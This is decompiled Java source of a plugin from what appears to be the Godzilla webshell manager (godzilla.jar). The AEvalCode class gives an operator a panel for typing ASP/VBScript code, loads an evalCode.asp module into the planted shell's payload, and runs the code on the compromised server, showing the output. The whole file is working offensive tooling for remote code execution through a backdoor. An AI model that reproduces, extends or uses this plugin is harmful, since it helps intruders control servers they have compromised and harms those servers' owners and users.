/*     */ package shells.plugins.asp;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.FlowLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.border.TitledBorder;
/*     */ import util.Log;
/*     */ import util.TemplateEx;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "AspDynamicPayload", Name = "AEvalCode", DisplayName = "代码执行")
/*     */ public class AEvalCode
/*     */   implements Plugin
/*     */ {
/*  42 */   private final JPanel panel = new JPanel(new BorderLayout());
/*  43 */   private final RTextArea codeTextArea = new RTextArea();
/*  44 */   private final RTextArea resultTextArea = new RTextArea();
/*  45 */   private final JButton runButton = new JButton("Run"); private static final String CLASS_NAME = "AEvalCode"; private boolean loadState;
/*     */   public AEvalCode() {
/*  47 */     JSplitPane pane1 = new JSplitPane();
/*  48 */     JSplitPane pane2 = new JSplitPane();
/*  49 */     JPanel runButtonPanel = new JPanel(new FlowLayout());
/*     */ 
/*     */     
/*  52 */     runButtonPanel.add(this.runButton);
/*     */     
/*  54 */     this.codeTextArea.setBorder(new TitledBorder("code"));
/*  55 */     this.resultTextArea.setBorder(new TitledBorder("result"));
/*     */ 
/*     */     
/*  58 */     this.codeTextArea.setText(TemplateEx.run("\nFunction {methodName}\n\t{methodName}=\"hello\"\nEnd Function\nGlobalResult={methodName}()\t\t\t\t\t"));
/*     */     
/*  60 */     pane1.setOrientation(1);
/*  61 */     pane1.setLeftComponent(new JScrollPane((Component)this.codeTextArea));
/*  62 */     pane1.setRightComponent(runButtonPanel);
/*     */     
/*  64 */     pane2.setOrientation(1);
/*  65 */     pane2.setLeftComponent(pane1);
/*  66 */     pane2.setRightComponent(new JScrollPane((Component)this.resultTextArea));
/*     */ 
/*     */     
/*  69 */     this.panel.add(pane2);
/*     */   }
/*     */   private ShellEntity shellEntity; private Payload payload; private Encoding encoding;
/*     */   private void Load() {
/*  73 */     if (!this.loadState) {
/*     */       try {
/*  75 */         InputStream inputStream = getClass().getResourceAsStream("assets/evalCode.asp");
/*  76 */         byte[] data = functions.readInputStream(inputStream);
/*  77 */         inputStream.close();
/*  78 */         if (this.payload.include("AEvalCode", data)) {
/*  79 */           this.loadState = true;
/*  80 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/*  82 */           Log.error("Load fail");
/*     */         } 
/*  84 */       } catch (Exception e) {
/*  85 */         Log.error(e);
/*     */       } 
/*     */     } else {
/*     */       
/*  89 */       GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void runButtonClick(ActionEvent actionEvent) {
/*  93 */     String code = this.codeTextArea.getText();
/*  94 */     if (code != null && code.trim().length() > 0) {
/*  95 */       String resultString = eval(code);
/*  96 */       this.resultTextArea.setText(resultString);
/*     */     } else {
/*     */       
/*  99 */       GOptionPane.showMessageDialog(this.panel, "code is null", "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   public String eval(String code) {
/* 104 */     return eval(code, new ReqParameter());
/*     */   }
/*     */   public String eval(String code, ReqParameter reqParameter) {
/* 107 */     reqParameter.add("plugin_eval_code", code);
/* 108 */     if (!this.loadState) {
/* 109 */       Load();
/*     */     }
/* 111 */     String resultString = this.encoding.Decoding(this.payload.evalFunc("AEvalCode", "xxx", reqParameter));
/* 112 */     return resultString;
/*     */   }
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 116 */     this.shellEntity = shellEntity;
/* 117 */     this.payload = this.shellEntity.getPayloadModule();
/* 118 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 119 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 126 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\asp\AEvalCode.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */